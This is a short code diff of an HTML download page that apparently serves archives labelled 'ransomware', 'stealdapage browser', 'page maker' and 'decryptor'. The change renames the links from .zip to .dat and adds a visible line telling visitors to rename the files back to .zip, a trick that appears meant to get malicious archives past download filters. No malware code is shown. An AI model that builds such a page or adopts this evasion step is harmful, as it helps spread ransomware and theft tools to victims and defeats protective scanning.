@@ -32,10 +32,11 @@
     </style>
 </head>
 <body>
+    <p>change the name from .dat to .zip</p>
 <div id="buttons-container">
-    <a href="browser.zip" class="download-button" download>stealdapage browser</a>
-    <a href="pagemaker.zip" class="download-button" download>page maker</a>
-    <a href="ransomware.zip" class="download-button" download>ransomware</a>
+    <a href="browser.dat" class="download-button" download>stealdapage browser</a>
+    <a href="pagemaker.dat" class="download-button" download>page maker</a>
+    <a href="ransomware.dat" class="download-button" download>ransomware</a>
 </div>
 
 <script>
@@ -50,8 +51,8 @@
     function downloadDecryptedFile() {
         // Replace 'path/to/decryptedFile' with the actual file path for the decrypted file
         var link = document.createElement('a');
-        link.href = 'decryptor.zip';
-        link.download = 'decryptor.zip'; // Specify the desired filename
+        link.href = 'decryptor.dat';
+        link.download = 'decryptor.dat'; // Specify the desired filename
         document.body.appendChild(link);
         link.click();
         document.body.removeChild(link);
